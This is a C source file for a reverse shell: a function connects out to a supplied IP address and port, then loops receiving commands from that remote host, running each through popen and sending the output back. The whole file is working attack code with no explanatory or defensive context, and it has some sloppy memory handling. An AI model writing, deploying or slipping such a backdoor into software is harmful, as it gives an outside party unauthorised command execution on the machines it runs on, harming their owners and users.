#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* For sockets */
#include <sys/socket.h>
#include <arpa/inet.h>

#include "utils.h"

int reverse_shell(char *ip_addr, int port)
{
	int socket_desc;
	struct sockaddr_in server;
	char command[1024] = {0};
	char *welcome_message = "Connected to shell\n$ ";
	char *command_output = NULL;

	socket_desc = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_desc == ERROR) {
		printf("Error creating socket\n");
		return ERROR;
	}

	server.sin_addr.s_addr = inet_addr(ip_addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
		printf("Error connecting\n");
		return ERROR;
	}

	if (send(socket_desc, welcome_message, strlen(welcome_message), 0) == ERROR) {
		printf("Error sending output of command\n");
		return ERROR;
	}

	while (strcmp(command, EXIT_COMMAND) != 0)
	{
		if (recv(socket_desc, command, 1024, 0) == ERROR) {
		 	printf("Error receiving command\n");
			return ERROR;
		}

		printf("%s\n", command);
		exec(command, &command_output);

		strcat(command_output, "\n$ ");

		if (send(socket_desc, command_output, strlen(command_output), 0) == ERROR) {
			printf("Error sending output of command\n");
			return ERROR;
		}
	}

	return OK;
}

int exec(char *command, char **output)
{
	int i = 0, stream_size = STD_SIZE;
	char buffer = 0;
	FILE *output_file = NULL;

	(*output) = (char *)calloc(STD_SIZE, sizeof(char));
	if (!(*output)) {
		printf("Error allocating memory\n");
		return ERROR;
	}

	output_file = popen(command, "r");
	if (!output_file) {
		printf("Error running command\n");
		free(*output);
		return ERROR;
	}

	i = 0;
	while ((buffer = fgetc(output_file)) != EOF) {
		(*output)[i] = buffer;
		i++;

		if (i == stream_size - 1) {
			stream_size += STD_SIZE;
			(*output) = (char *)realloc(*output, stream_size * sizeof(char));

			if (!(*output)) {
				printf("Error reallocating memory\n");
				return ERROR;
			}
		}
	}

	pclose(output_file);

	return OK;
}
